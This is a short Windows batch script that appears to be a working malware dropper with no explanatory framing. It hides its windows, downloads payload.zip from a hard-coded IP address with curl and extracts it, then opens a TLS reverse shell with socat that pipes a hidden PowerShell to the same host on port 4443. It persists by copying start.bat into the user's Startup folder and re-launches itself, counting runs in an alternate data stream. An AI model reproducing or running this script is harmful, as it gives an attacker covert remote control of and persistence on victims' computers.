@Echo off
 more < "%~f0:Count" 2>&1 > nul && (
  For /f "usebackq delims=" %%G in (`more ^< "%~f0:Count"`)Do Set /A Count=%%G+1
 ) || (
  Set /A "Count+=1"
 )
 Echo(%Count% >"%~f0:Count"

powershell.exe -WindowStyle Hidden mkdir C:\Temp	

start /MIN curl http://194.195.114.92/payload.zip --output C:\Temp\payload.zip

powershell.exe -WindowStyle Hidden ping -n 5 localhost >nul

start /MIN powershell Expand-Archive C:\Temp\payload.zip -DestinationPath C:\Temp

powershell.exe -WindowStyle Hidden ping -n 3 localhost >nul

cd C:\Temp\payload

start /MIN socat OPENSSL:194.195.114.92:4443,verify=0 EXEC:'powershell.exe -WindowStyle Hidden',pipes

xcopy /s "C:\Temp\payload\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" /K /D /H /Y

powershell.exe -WindowStyle Hidden ping -n 3600 localhost >nul

:# Terminate script execution after count reached
 If %Count% EQU 5 (
  Echo(0 >"%~f0:Count"
  Exit /B
 )
"%~f0"
